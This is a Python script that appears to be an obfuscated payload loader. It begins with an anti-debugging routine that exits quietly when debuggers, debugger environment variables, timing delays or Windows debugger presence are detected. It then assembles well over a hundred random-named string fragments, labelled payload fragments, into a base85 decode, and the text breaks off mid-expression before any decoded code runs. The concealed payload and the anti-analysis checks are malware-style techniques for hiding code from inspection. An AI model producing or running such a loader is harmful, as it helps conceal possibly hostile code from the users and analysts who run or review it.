#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_crdbl981pQn7XB = '6%x`I$*mAsK0FZi(tV3x|Kh9aFA-q7k!D?w({4Ci5efuvTOxFQnAD;HFW-1O!g!m}Fg~bjpkPf'
_ciIlk5NhOuRQW8 = '#RO>YraW_c5Pxz7ze3`F5PlqwGn;D0)KdSnt6-Q-G|BIKzkRPS3<VdB4o4N0uTSPThLV~;#S#E'
_cgAtXrduX6I8sr = 'b(3A6?8uM-3_!Ag1bE1EJ<z!h!2HmMToXB8gd98O+bt&UsYO&ZNy5;QqUqB-}C)pJ)`af)VNCq'
_cdyDeWAfT_WW4o = '00o5m*~YvhxJ>`bfY40jKQv#n?UQy$z6boPhnVz%|!U(a*R^xUo9+N_x#gDjNEzdZjJIsohQ|<'
_ck2Tg4ENJoL7fw = '0}D`(v9iS@QPQA)t<;mr<$6sPw;d@l8o-l-dbZkCl!-UR_{%xEsGIEb3~{FyW}$7QTk3~u}}~B'
_ctPTefbQLJgWHT = 'S|&HTc`=x@t~U*CYyb6vrzK(zsT13kliWZAItRU#d>=YgHF>J#o2A(>GORHwE^lIW=QC;ISgLl'
_chkn87iBtqwq5T = 'X+rUHI)=&lyYeB8Sq<_KtmUq{H)F!sq-4%upUargs%RvX^ZGaunW`;|w`cmb9!Ea37nSv5QmwY'
_cfnU41IjQyTAoT = '5A&r%l`irndZGyu>vTs2TP?!oB+IBlK=Cz*6fcLf%i9DP4o+=7UTjqf+(lLT~8_oIwd+Vn^$=&'
_cyZRkCAZ9nkgdJ = '~sK8hJJrIhRH8<ubX7eh+OPzLcAPcs=Oy>?rqqThd2PO0^=5Ud3{0NYDy6UBsxTy~MzFi{tVY6'
_cuQN_TMnncEicJ = 'PRyWKlKai(ll-yuSS;xcf^uRq&#+~;N@9zHut#f&pD4eeTllO1kn-!=8k{pUyw|^GTKC8UkRd`'
_cfVnc5n8bcweyd = 'um6H}$gW{39(P^UXX29qmsW7`+|YdpNbPH7?{k>ox@Aw)x3s1QLA)=-&91|2Lt%fB?F3%XH@=V'
_csMSFzNCxJbJyz = '$GhmYcxI;}uJt)Wl_+-UkZ>bP5r955=P374&6mqMy^D&A_bakarq&JfYkt6rKX&U2W=@6OW-#F'
_cg2qPphS3ZiCKg = '){62b7#>73U|GJn3`V?mKb?lbWgT!k}AZU;l-0I~$z$z%G$K;asXT@VU|FBe2lhh@x>>3)aUu&'
_cyjlBfI1czjvTf = 'sTUDkEV&hl%E~xemM02^$bb(y-*g8QQ4-NFG~;TnD`_o^;XdBY5Egz#6&TBqLLI5UB)qc!DeZo'
_cho1o3R9rElEoE = '6*Vp_Samppph1*4{i#E<NIRFTFZ@eB07B?y06M0&{V4JW~R?9UKATnG{j0LuG!TeKxRZ7J8brL'
_cgdbz1fKWXpl2F = 'mhvGL;1y)$GzQA8eaMOIOW4zk!$DVuEMl<HWaA*+h6RtwN<s&JQ0{CEWq@M{C3bJX9HXPXhNfr'
_cf1sCfcyP5hBYW = '#;3%-14*7cy<;X{0oK<(%6I*-w1@0~?VepyPv=Nc3p9lsx{1zbSz1b3OYzUQbBz@cvwpEZX%=#'
_cnu3KesW4JDJbw = 'n8;ZwfivY5GpuSYq>)fr5@_tMPBj@GZ1s24f^6m6;9@h=DtcCRe|W*FIPmWXmVgVa5p+#Tqk-2'
_cs6dzepuzw2l9L = 'x~EV^>79|H=-hcjjwL@D<z}YWR9`>Gor9L1OUMr~sPrg=blpHp3Op#XtO6fv}><SGuYkHb*;Yp'
_cg0IrBPPgUqFFb = '$Mfz2qwEO*KVc3Qro&R%b(3Rz%}5vvkj;G3Ch*~6NHH1;KlASr+?GEp&e~F5vTKT1YfOoyZ(NT'
_cqL4HvDoaqgin8 = 'R(;68tEr%w=u+2~mS{pmH%mH(6sj>EOP>KI9W+(x6bQ2at0q=MZ@|8pQ=yDK<PjMgJ72V?=doq'
_ckJNyTe9iC_Ktg = 'H_189E-AvhCyZtu;3_j)INmP|Q?OX|>5tf|{L)a*)@LeYDdwi2PKNg+}NmF(Nn`+NAlJQY;&kI'
_ckWzFGXUvBEOrQ = 'Skg?KL^@?)zpjv>wjMyrP}+z&p};hkBYOh8}~9`q}`X!cT2V{s;RYa?}3gQD~sd7g<Q)(38`!O'
_cnGMJ1zEmgQ1eA = 'z!#dyzPfy<!lJ+es(!r&R-!`|r$H<I4Yq#}^M{^sSm67NDEe%F{^}0$5$u-$4}n4rvgE9}&Jea'
_cqFc37wgdG6bmL = '8}I?zC*GZpB%J3<8W)P0(lhG!sp{6$n=r2#|3ZwWc;VlF2R?$8a@fMebdB>Ut!(@YAd*WhLT7D'
_ctxBfQ7CUypPSn = '0I+hiTU1|1RiAATZ;yt{h6d)ncaT0Vy<a!&1zcv?dEJezPVv(cKA`9DcTA~Ge!(-M$+QxZWb&s'
_cfEQ6ntECfeuOK = 'bT*Fs3<MrJR8ROlnA#Y|;bO|Ug&N=!1)i?A0f}Ge+{q$8>4=ihGLphB+==BU|Yyl|U*}k;p%t@'
_cqqEiYq3g3QUhc = 'wIpmwJ(pc)cD81uu1_C-&0u{3;Y2t+SMCSVgVraecNYV>C37)%wbFD}ZpOQ`=P1^Q%qY7XNU7I'
_cjKUo_gAfYVawe = '`Bp!D{ce`s<&PEqYP?mIBDFlq?y|<7bY8{C<B)d5{3yc)RYYsZP-8#zc*v9I>3Yu$ziHENxm2P'
_ccWPjQ9Xrm3ITB = '-|)45`4g*$7uZD)(FSWq0zH~k&D^fHkor_(6cL6ZvmX-%$1Z$i^gfHzMXJ|i<$YSt6#Fh2}yM5'
_cs8MqiYCFdgMSd = 'b)5|kGI=q$@c8ZqNt_#VbjlIC|Bd?%DwW7EY5Ag&KGW~u;L9^+-_$4Ov=C!yMe%PUR$-Yfl({F'
_cfPS3CHjvXN37_ = '3o9k_*Bn)kP_{}*0kz&$D6q<#u%eP5hqR-LMAa{o;5}s`^Gp`H6^I+ANx)!De-uDzMZuyi#JVu'
_co1UY8cVPDJCwR = '?4eNu;iLZ(|G#i1GN?mi7sVXkyYSBt!VM0f;qaxNRDkr7jwu45qjsC~9WBcrQE&pP;Wsz}EJfy'
_c_XclXv5wmOrrE = 'sl%XUioKB^SkPr<H*D-?pPIb?&bq84Hq;I52M(92*~q1#z8ae9YuBp^;`;PQNk@VrCo-E&;22Q'
_cxz0CHx9UlouiA = 'NG=8_{|4mNOVTSSEQcLrJYEhjJP>H7JF-e9*1n!WU-38j!LRVW)7d=wny?hE#cEj*+cu?rShA_'
_czUhh6w0ZNq9wi = 'Jm^73h86non`E0beKhZkLR|}8U|d>36sR}=rU6t5%&pIo*21$d-X3$ybRoa{s9pbNkj7;A)Yg0'
_cxw6eWQq5CLveb = '|(8Y?#+>oVvTFNdqhKY>08qiL@Uv`P;TgWx&{qdrULeLXw7;X>g`GFC;6wkQE93{MCj~1~}@)#'
_cqw6M68FiOiwMx = 'e^(5CY?A&x?K9#@LPIbF>K{>J2Y%|S_Lf|@$KLHLocJ?%+4KKEDbX=(M6E0WGY68QWD4{eklvb'
_cd3LRQK7LtfCYQ = 'AT(V5$d)gUTNsPqLUdt!N`+!WNMtiPZg71_rNbgU}uBe=_OUfCtd#nCM=D-MBrkH`dfjpFsr&G'
_chCtRbBVkHOHfl = 'mGO(Y;I=Jcmy5OKS2%FJZxlk^yhwsH8a_W0a$LP8KM~0cZq>Px_sxCU?|gmtt?<v!yatKYY?*B'
_ceEqqu5AeKbdbs = '^9YGML&BQwxgqit7rdRw`$-8-plp?i^!}TK)&4Pyq7U*ovks~LG&e=^A#BL;iWm9$$1U{-7NFL'
_cztMqoddsNcDkA = 'DJ>=c8)UF1o*7v*Fi@oPC3bp9i%#Es3Y_^zIRRsK)m?i2~;>^e88%}?F4b&#HQ!)n$$l_g+Yu)'
_ckEwhFzM6gNIll = '4`eV_x`=-F_*esGNtEMB1nsv331Wi*jU<+Du1XHOf*fUKkjxU7E-aFT5A8HEW3pjeF{fS#~e(Q'
_cbc2ZWuGJxLTee = 'FZv`5v#;qEce&^^TN!?jGVEjsa;cX39=|YYpd4#Y#tY!<~CxfLv6d5nj38ZTST7>@8BUn6SU8P'
_clnmSzsu6wpofU = '}jWg8)Q|1dk%t9(}Xbk1IT1)zgI#11O}IM=4}u#Yh<hcFlNI!&M~2ZtXyK>X)LYttHL(>CynU5'
_clERdXxUVHm8aR = 'T8-heAblo|w8%_k+{!-?;f-8|978ph$)LtC&I``93z4|-T0Df>p583R)3P5s^i?|lQy;vbCMRi'
_ctrwD7dceJygbn = '7hJ@=Fn#_<B4ohvXEK+u>U}ZRX2Vf0L0m?nsyny!m1kZkbaqv22%Vz*_U{_f>tE(b*v+N~V=0~'
_cdiz1eEMGnB27M = '3HFBi3VFIl%~k~O^ewfXy?-L{oVLU$89zl}N%KXzclj$0lJwOSp19c$1YSm7R9*bz1O)aT)7i^'
_cn_LolzTrS1dKY = 'U))uK0I97J2fM`>Vgp5v3PjeqdMXW7XDt?2o2yZEhMj-fq-udv+wG0$4PX4)jXKONWLeuS-mEv'
_cyMQLXdBHrZ9tp = 'i+a28-7XcJhZ~WPR?P{uPd93>>z~!mW>wk8)}OGuTy!(w7-W&Iq9(d-W1lbSN#od^M;3Dd%xDg'
_cpQ_us68ROXDCO = 'F{APHeg9;B=}FPwI>nvvFg=q!H?L|x;Oq+upad$rKUYnuR`u@|4#Wqkeb4FRsxPp-HEss&bS8('
_ctK2rrTeDkNMgv = '754beUolH-)25Gj1S{>RiEfJV&y|JT&tqL~(aqfc+ShT}?aB%XK5_xWn7L^@xy!Bduw8NR>#+6'
_ccNEx8caCO30nE = 'j_wGN^X*@w&D^1L^Y*wLr`j3IsiSAdG)8!&zF32Z|$zmwWEx&1$gzkX^q+iM_^&OmS=Fvc#UI@'
_c_Dj7b1Nc7_mAd = 'XQMO1_o1DL_AS-lz?DdjxdgH2mH{seE#P`=Tk>19AI>de8BBL0hxnI~X0vVWj{sPlP4NFL{0)W'
_ccd51f3WgYdo_3 = '#5${6-#Mb44qc`xr0%MV^~V{d6@s66Gh37nSx<W9gF5CEmo735f&9ROfKKQAn44`j(fUx2{n~c'
_cq33bCzgOuGBMT = 'vT5+9WsC3sCWqIPX90;YrSGwXYsw`S*t3-<$u?%siig8pkAMI+J_*mW5VUb+$U#3Q^}Xz#k?vB'
_ccXmczULjFqJdv = 'cq%LPl%-=9>MfnBC?@65#R};ZeTSBu{L}lZExJRVn<~l!QEJB^6P+CkI&L|Q6fsK5xJBKJIIDw'
_cwyiimELyEsQSn = 'WfNeG+t$ZkP{;K><w&ZZVD`_#R1vgs&j*dH!U4e?uROhErSaou!O>oDP!&q3zYrTMr-w^sw<^Q'
_cvDD8KcwOIYMaW = 'pwcy{Sfn=m{MIgMws=5Xv{bz^}PPioey=amHrw^`q4^guk0#ZnqBlIKTmH$*Ki$)KyR0QzIsHE'
_cugtHyWbIP5Gm4 = 'vwatH|hQwK<}CQ>A7wDuGMn+C%J(2c&g$Y#g_Qsz0CA_{P>gRELL-Y+@yFXjw%`yRjrIwF|rT7'
_csjAbOxSVb03go = '3MBtL=F)3?>t>9O$rbq?+L=>A>wudxf@Q!7j7H!Fo`i<3^--?4lOZI5*#sLF0M`mSi4R|C!gD#'
_cyjzap8ozKg4ys = '?>$z`*tvK<%$+}49{LyH9kg%ADq<kIJs$-36`7KfUCYA^4V6Y3wZ;`&qT3cD=uZZ>RLt1}bvf%'
_cuiW1HXcoC_ChT = '`B?^&NnaH*hhMw>hxY1<W5R&2@|YZk{OZ1vuxTZj(=Pg42%<o3Y@4r!p!p<0u`i%D*z0{{qFEg'
_clJlGfFF5cxA8Y = 'X6()@kTvfilx=MIH!7cn5O|y*;!6AMQ%bUq>X}A@iLr5D+O-74z7<Q06ueFxJ@<U2)VIy8s8}C'
_caebTx9ww0Yi6z = 'zhH8hEK)S<B41cqdScUne~DYHS&V#EXCAN;SaJqg?+*ff!JoPh~8JDBL|N!6y&-PZ0OWas`yG3'
_cjWoNeOdtce5DZ = 'EjX+Djz|VYb-cuUd)94*3%I4vQ?FZ;gNZuPu<(9D=mR=B@DSVeGlT5m<cPa=(F|*s)&#6#aCHG'
_cvRMb9LObT1F4x = 'fEBO;wnRj!E4yrboAJk-w*{z6y5F*HKZ~(^&Fa$a~cFvZl%2C{$J?v3VvD7N7dED)|pt+=(I;6'
_cnpRnkIK1ZFuTV = 'L6DL@-X@qzHiAYPFE(ugF4?PX3aP1A+7q*;eY4&s%vME4h<;cdwc^=h{~r4_5nESoOon^S5BCE'
_ctDIp2bBXp2p5Q = 'u--Zn?@RG|u7K*aU(6gl%&s0Bj4OOs<OC<uWflL(8LdsiXd|8od4CSC<zt-u78U72cY+uZYorw'
_cjpVRfPS3brjSf = 'qyuPWYPmsmpU@Js}-m?<{#YM=sG+P>ShL&$|uQC4b4o%K=DopV@5+DVQ*9gIzh+C(7WdR>49S-'
_cfX8gthhnK9XeW = 'G`@x8EA(3q@h@M8vVr@M9gR&Ch<XdK__ERFIpxTCX%PGO0M1OIn;?QLbMWWytZKNXAVXLqp|b!'
_cxF7VWO9YJPPho = 'F)?4v$>p{T9p>sEh8l4GSk0YT$&dfSLrib!_5UpIr`v)Vs*yMNzLq!!iW~P<8qhAF5AOBCkjEa'
_ceQ5EYxZLrz5HX = '<lCqA3vJPWUubvbXiJ$!DsZCs@be1>rEN?p1kJi$jX1K`SKSuHzQ$14~QX=a_r<^cToF~WjF0&'
_cjEU7aBVhM1Bel = '_c52Q&p5xktg3*I2je4}TJtR{m-Fko%*~<!Fk{$W3m~7vw^ubsXb5Gt2A;`|ald654X|>!?5A_'
_cvVc5fEReUezlJ = 'OQi6UTn~e7o`ir>W_qxse!Z<hE0&JXp>YKjf@8sZ3wLzM2Q5faQ}TqXR7sIxH)99uZ?#)2KVDb'
_ccuWOYiLDi8qwC = 'IVsBwOx77FD>E8*opZZ`A?<C}e2{A3iN~G1fpLn>M`oPjgTNKG5nMcqdjf5KM!SOc5ITBH1uby'
_cr9z0Kvax3X85x = 'oTZs8S3!z~vn5XkH$_mS@*Z0PqVd?2#lNcl|z0{FnZVJ+?rjbr=hqP(Cx!}MmPhaCfwcAmnRb4'
_cx2Ir9ZEG89qX_ = 'Wa$6C2NoCGF>HtwhYZ_53E>J4exIWt|{$nxt?3f^qJ4J)4r^{4y!{eR9<)B4gCT#ceKsh#@0Xc'
_cv66GmXR2akCXB = 'jI82LNm(gXV)C71u7cCsNC%=iz6&%TMwo{Dw@q?UlL1%jB&4#~pI%Qu9MU@Y>vGIqnqGD5r{|<'
_cvGr_juZ6SCK4k = 'tI56+pQtU9nb5i7w&%Db2d9xW66`Sn5Tj%NjL#^`i#!(HXwF+(!RH_dRmKbCx97qh{WCut6r?l'
_cuobbDpaFidCQx = 'jpNe^hF6R@bY*Io(|BFcFdp#;+chc1TRUk|jo{NyrExdoA<7+W&@%3$V6@COu6Uz1ow2I;w@+E'
_cr1ggzbE06mP3Y = 'QKZGWo)cm|w4P`cZyz@z}@EN*mP-}87DQ{8-P|j*SY~Sf^(lu)1tlwBIpm<wh5ANv3z=aBDFbW'
_cckmlACzTRTADy = '<O>H|@$hw$dQq2D`-tuV%W*T3G&`F&0BuBx2y;!9q`Bd?{t;8V1PHcLxtNQU$eQY&&tTYRNDJ8'
_cft4Ur1KGGKtDQ = '**{KZQsf4rY96!yI0czd{D2Vt!Sk^y{_nObiJIz=2!J8`Ci@z`C03m^M+Yh_uqr>oW}wi@l@pn'
_cypzBlb9fg9DHY = 'MJq465*89mxz8j+Ip6Jy=@(GgRh)d^9jtEV}6`HoQ|6uWH4J%$h}{l?$)v$>oI$(rnof2{H004'
_cd9V5pUNlzGvOq = 'i`tiL(Bf)#;?Sxk2XhN7X!+KIC^{%mYf#;mQgU&f#wZng^8axjCq0Ie^w!k;Y9wlE`?#QbG*+v'
_cly_N4oX_t1Ss5 = '0w^rE=BCxsHAUX|OTr9pp`hdV;<B&XadAez@$PQ&R+k<7}`nVttYP++A^?lJnbHe<!xvhABL7M'
_cpoTyrI029XoTC = '|;S#oH5ubWZIy{+*zw>HK$%dAMtz&o8HfR$IdthP0A;@Iq895TzSY6Lm=KJYJ_I3haVI&Y5Wb8'
_cqpksG6b0UqBFT = 'gNo(QI0v6l-~pZ!plQ*eph?%@g)L7Hbe9D#PqxymfHr%jlS=JIy7#xaRzK`$#<;84lR2WWfmcT'
_cfDGvo7Meat2Ek = 'rdgf9kV`4iZ0LqRI)vi6T{cW%>I+M_qORlzL7%={^i^$x6O>bWA6&L7DqYCVj7;6MioSMs)i}I'
_cg8fJC9y_cVtMt = '+6^P?Xb`>S^#917bV;puyr!#{#IqsVNsXOUg>)>)`Vbs{BhNGs%5M)PX^yjRZHtwhg-`B(a%rw'
_creSqZ0AB7QFp5 = 'Jx+lAWick35Kk4XHIg`8<Z^rsG|Bd}v!`OS#o1uTU(52KCNdI4k_t!%jo4u5{M9HJ9%Msx=Csu'
_ce6onJRGsDuE_S = 'vYA_$K1P5p>%WW`qBdD>kJq=?F&-+@ZEh+${dsURk(a=9j<AzL(TBz@U#Oq@_hh0i_SHW@@8w)'
_cc8ZfcCT4qZoOR = 'jZ5<h{0(8w|^b{I^V`6o<9I>ABGw;aH?B;IYX!&eweXsY*<=23CERNGqX%CtCONngrBq?#pfd4'
_cyBU0B2IDHfruI = '1#lV2>Onl=B&Zk2_NwrM%;X8qm)r2c@FvM+VSBOnT)fXQag_i4t7wd^Puc%gtV179E;GWI{5S('
_cjDPT30JefRJDv = '_k*iU&r?ysB)DeT2=-6yISkvaTz1Sc!Qqx>@KOEOo+R+ch>v+75?jD;5LPNgBvcnWUrnSLXmmd'
_ckQi1wQMq2G8gf = 'yhf)=cwJxPr>HK64F3eqCOU0D9YiHoprX8<31wbm4_8sgo$p6aT1je~pq!;(jVx_^Le9NYS;TK'
_cagWJL52AJuk2y = 'u!k^}detKF}%%iUD6;d;W<D=jh+tz?Fpr1!A=^p@tCkJVeTkZZ}-H>g(P)g)qwb?et06f;%_e4'
_cysk5bIxMzwtuc = '#?)Lha9g5D>V`IWnwGXgwvYsBF*QVxIn{?(~HTp)s%Rq(o5i6Lwx9sff*Z;oX1Nx)u*N-uetj;'
_cwHANJoviI5gfh = 'qqY^Fzus-;L=)czKYE6j1W?u3zLe{OT--5Gj~*neKFfe;QWuZpbcaB`tLZrVz~GJ+!d_;cKm1y'
_csZY6vr_p0t50y = 'ha{#8Jq)TQ{W$i>hYK)(C0TBO_B8KuzwOY<Eto*~${N9pJ)y`PTDr<h%CbgHpw(ZI(c@}-csDT'
_ca3979sJ8Rploo = 'zhsx_rr|^r1xv7IV#$f)3B>6Ymlf@vt{=WuUr#Mt;EtseiXYX&ke;egPt$EkS%p{r~qk{7O*(R'
_cmTPHw9J4jZYsa = '8OovBgQAqz4hHjCdB0>0kz&mnzSaslu2L*eM8{a`?KYJJUBDn+^<7+x-suC&y{ru?;6rGL6m_r'
_cqciR09JmUtR2_ = 'mif_H&x8X*TFOf#MQW@CA-QtxQjd^GeOPb$R54IkQ74W&pv3E-<+X&S5}y*CpgaewrxrxE(7xJ'
_cyEdHl0yi4jcM0 = 'hm^NAZ3fCpC3z4CM29)3t%Zj!J%ON17EB;#MLEUi@cU%`NE3ctoh!5@bYlZSLW8B#c!2`2J{1~'
_clBXcaeVCgrXwz = 't;M-<WVXGandSuh+5`4*vr7SRG34-4J!|36{jTJFf#v}=9=kN>Q+_(b#`T`@$AO1xGab{FJC3u'
_c_n4BsbbQf01lW = 'Kk+VE*<83zDIYMg&O=9QpM0z(y%iF%y4FYY!W{f>njcinSJ4r;)rt@mbcbb})p-52TN@3GyOEB'
_cnLoB2hksYf6Yk = 'r$hN!~pFu5d?-=)1WIIJU@!@14L5Z9EvPhU}jy_U-THg|ESnUoT%$bSOh9VYQI0Jgn^Lff!SxK'
_cgMmhxRiaCdSJy = 'wy9>Vq%dFK;5wqCqCDbfl@INi?jNp4>tbB(w8A1vlPc&UmY0X+RIHv-^nw<BvzW<kxt#cr1h-0'
_chwR1CIgS9xwzn = '!i2?&AiAOt`|rttxZttPfKxsv9~!zj?`T;_Ghvs-A^1si=zrT*YBntB~WEsXG#!+4J@pshG&Hy'
_cmZsFpHKahSxT8 = 'S%}<o^ce<vV&9y=Rn;74=|}_#nc%PY9e223`1b1u#%ds>Ww5{y$T@cAqVP0UV4+5j1VR#b;80u'
_cgsMHm7R14iFPe = '}^WB6T+@rCiS*|*lEzZCK|4ZiuPPELtQwJPUjDa~kZ7$%Uatj1Y`%w~YtL{Wao1N-G6@RoPbco'
_cmgxlDohfQB5Lb = 'DTZ?;9S4*UUdSQr4L(Vz;msLv$eEzF8Q*EwADP#?_TQ3|gk)|}I(HINBzuxQJ3UTb-UH6+XN@m'
_clPBbGfnqRiIYt = 'f;svzmUCmH=v&S+RAh*T0qR5gME<89_qw+@>XfNfHac31RHYXs-$i?Tztc4_3hUV(^1o8$7wG@'
_cnt36SbWmtUzXk = '!mLi=Y(Bo2TOc-hHh@2h+)o~wY?xqlI3-j^uuE>Q8O9pi<I|6nX3eq>HKr^N;6kRi&Oa@%8y_5'
_cpkOFSSuUjB5WO = '`FIVaXZ&uR1!>lf@&);}j|}b|RMX=+>1t&1+yppLWoxAJgr;{VArTeDqBu&f86fRZG}k2RS{y1'
_cuenDVKcX1zxBm = '7WgackJgls#$MIlYi_XlFNw%$ow%CvsZ-%gl01>B80B0d9*ydmrl^DIV%fjPFNddY%loWos+@j'
_ccwcZn3wxgaOjG = '*Pu`^)^U^S~)5fXHuW(r*xLMz35#xu;ui(*E125VwJEJZqrKtlv(5Cg@78xK}4h)3n>JaF+Wi@'
_crmA4MoEnSzcel = 'ZeS`0|S2M`qyt%1UAgr6GoNQ2SxyTK*68z-A|W?_c4kGe>9yOT=tKSOAe|4QjEoWWR5KR<VpsC'
_cnchYYIpkvx9Z1 = 'B8G+JDmVs!$`|4f@MDeX;E9m#=AGdi>k@~d<TiQSC-kHEI;&VU-NWW4etPd%xk&zm`uW49VTUp'
_cbafL8Do4rYGfU = 's&lYNRGwp2l3BIFvT{!9ov8rM2DS%`75f6{Y((?Qc<kQvMJ1}?2gQ)?Zn=(+XcAsx0sCG7emyk'
_cddCzn977v5ZdS = '~Et`Wc*Rhm&k96j__{_-+_djODr^-@yk1-T8*9Nh)j`qRwoBg8xH|Y?ykaW^Mye5-ZRz?%ZZ0!'
_cpdrxwInedzTLQ = 'q)A2U<S^@?QQj3SFm2dyYhrWIC3OtieYX-HnsYBwPjns6GWEx~{f6Hy9zlA5obgyRA=$(J0uu-'
_cjklzolJ0rEPda = 'cnQL}R|WX#h+hLP_l!EYdx3?b><W6_3JXghqJcC}xCfPn$sPIY?FBQVtdon&fQB3g>zwGIrS8Y'
_cbPIRMrJMkkVx7 = 'k+$<RT^lR9gA)E_E}b2yN0TY_Ly>F;0TzMhy&`nt^<9aAYjP!%%p9DDUZCKpeqr+7iu@ZbL)n$'
_caceFBW7kB1mkN = '`3V~!IeL;r*o1lnYWIX5sGaSfY`T9=8qM^%C&N|5azztSiXwn4c!FACZJxmD=w>~-S%Z|R+0mb'
_crER48ZqvHmk9j = 'Cna~g9vFD_5xL(c5t!Z_Ga^Hb(<w$uUDFu=s*jQ^Moim0W2AC~_?Y<Qn9=k=sD#+p1omY@THp7'
_cocwf4NrdnakJk = 'jokW4imkO#O&iG)QGSxfP2tNF3sg32o95=~;doV#mWC#wicaG;lxo@w`v<0nq2V#xWJk7u+BIO'
_cfpJK8KJ07yDRa = '+(-E=gQFm%4hAVE1|QSN&6^jmhiliq#)h^k%US%OoC%UYM`D<yi^OM&h&LlCG%Zsmn+#R2`n~0'
_cyQw1eGeBmtAdc = 'fLV{csiBij9A=-;Mt!`X@=~mk&-OXpNwe~%+wr}7@(!!SMeVL!Ld12z`4CBU{XM~>#&Jr^vU3*'
_cuVBM2JjNwiFGa = 'ha?8p{}1*&d~{f9*|;bzcRD7IIMoZrafe6iFi`NX4_kjv9-6E>SK{$R`tg1=@M*fxDxxgtrC&i'
_cmPYpPgpkxl3Ta = 'ig9D%{RZ_511YK7RH(k@V2_o!*yIMQ8YY5_|O!2vT7R@TEA_CR8E~002m@jHLqPxwqV0|S<r(6'
_csEQFYRp5kGw96 = 'IRK@Nfoej#Xw<K^*Tn*J@jh(Q$hjqwcynv8jy0;lv74&sBilHeAiQj)GUZ;k0D;2Wx9vo35A5U'
_cz75SjKJCbRPo5 = 'Ur1!a;|sYZa-0<1;Nxu^4dEJhG-V)@rZp?imL`@YGGYjMs1Eb9)64j1!KM?M6W1Rwem4ciLI*-'
_co2E0uKaMEJRBk = 'vfx7^{JP}cSKv61)060h>Y)U7HF?Bs1c0GP4TGe93jzfqg5b8r#kGXmcKK-*kKA7BSTu`-Ng?v'
_cubCsvBWcgyca4 = 'tSYNJKTR-wgi_cH0qst?yzPqXYzQ3SWOz?kKbz%#&-Kn<VO>)<F?I(&qAA6dX<rKQ?~-2c%`@1'
_cmauZh0ynq03nz = '6b8<`yH1CxmQun!Im%vQqsnQw2*#27PhoD*ac{&@NRxVU*o5$QfmcjlaWlPo(6y&G?4kTPXwl+'
_claNLJ51yTZ3Zh = 'vMq~DVCZIV};)=<R;?YP0Uo|A<r#S~Ob+=Fk<TDR0K0bb&-=Z`k_<9SS}g>LMEU$EjBiEO9pMB'
_cwjQXcOBwlxxaP = 'YW<o8qtE4b<?BJf#xUZpZLn^+nk>uRbU-0R8rqFP7NFFLnD)eVdc^I0J)%HI`{1Qr%9yx22F$Q'
_cokIqtQsFpmzFP = '|y?lM~7pJt)kt=P<pB`2)EjVCiWb;pRIF~L-8Dy$kH)~UrR>nETe`0o@bDIC)GM%<*m%3RcRV%'
_cdCRKtsJY03xpS = 'UG+oiy?pO95aXE}@)k(ki;0}snTwDspey7EcVjK$C8W397dSQOaWt-ZsA+CBLu5M*;tA%AfvQV'
_cqGVsCIjOZ5wXB = 'ZXWgSL)p*^S*hP4EkOz(mj0q-V_b@~V=-i^4cq7;K0vqI+jn{u`)VUV4%f9e&u<3VK2#pexpS?'
_cxzeLnv5quZvC6 = '{-U~xzh>7glH2e6kVB2}&XZ!n5g=QI{fB_0JMElr|qNe~4mWI57%7pRpPBga=6|F|OFl-!A~;6'
_co_0lJOQkyQDvA = '9Y>12W%pZ7Edv{&1j6)<3PZ-;Sp(7@pD#$hqJub#Wi<l61>Wsfn^|tUUsEnU1f-tDYvYCie<|='
_c_7IBoJPgMJg_x = 'Z@aedNn<6ep=Dgu>Hng6GLmp$K)1o;y$|dBb-p=KwdRFi0A2}b?EJfe|-|<lML^}?e70HQvMaQ'
_coksfHGfiqne36 = 'C1>jHaaN5luY(HbO_rI|h!F'

_pqLL5KqMHvqPf9 = __import__('base64').b85decode(_crdbl981pQn7XB + _ciIlk5NhOuRQW8 + _cgAtXrduX6I8sr + _cdyDeWAfT_WW4o + _ck2Tg4ENJoL7fw + _ctPTefbQLJgWHT + _chkn87iBtqwq5T + _cfnU41IjQyTAoT + _cyZRkCAZ9nkgdJ + _cuQN_TMnncEicJ + _cfVnc5n8bcweyd + _csMSFzNCxJbJyz + _cg2qPphS3ZiCKg + _cyjlBfI1czjvTf + _cho1o3R9rElEoE + _cgdbz1fKWXpl2F + _cf1sCfcyP5hBYW + _cnu3KesW4JDJbw + _cs6dzepuzw2l9L + _cg0IrBPPgUqFFb + _cqL4HvDoaqgin8 + _ckJNyTe9iC_Ktg + _ckWzFGXUvBEOrQ + _cnGMJ1zEmgQ1eA + _cqFc37wgdG6bmL + _ctxBfQ7CUypPSn + _cfEQ6ntECfeuOK + _cqqEiYq3g3QUhc + _cjKUo_gAfYVawe + _ccWPjQ9Xrm3ITB + _cs8MqiYCFdgMSd + _cfPS3CHjvXN37_ + _co1UY8cVPDJCwR + _c_XclXv5wmOrrE + _cxz0CHx9UlouiA + _czUhh6w0ZNq9wi + _cxw6eWQq5CLveb + _cqw6M68FiOiwMx + _cd3LRQK7LtfCYQ + _chCtRbBVkHOHfl + _ceEqqu5AeKbdbs + _cztMqoddsNcDkA + _ckEwhFzM6gNIll + _cbc2ZWuGJxLTee + _clnmSzsu6wpofU + _clERdXxUVHm8aR + _ctrwD7dceJygbn + _cdiz1eEMGnB27M + _cn_LolzTrS1dKY + _cyMQLXdBHrZ9tp + _cpQ_us68ROXDCO + _ctK2rrTeDkNMgv + _ccNEx8caCO30nE + _c_Dj7b1Nc7_mAd + _ccd51f3WgYdo_3 + _cq33bCzgOuGBMT + _ccXmczULjFqJdv + _cwyiimELyEsQSn + _cvDD8KcwOIYMaW + _cugtHyWbIP5Gm4 + 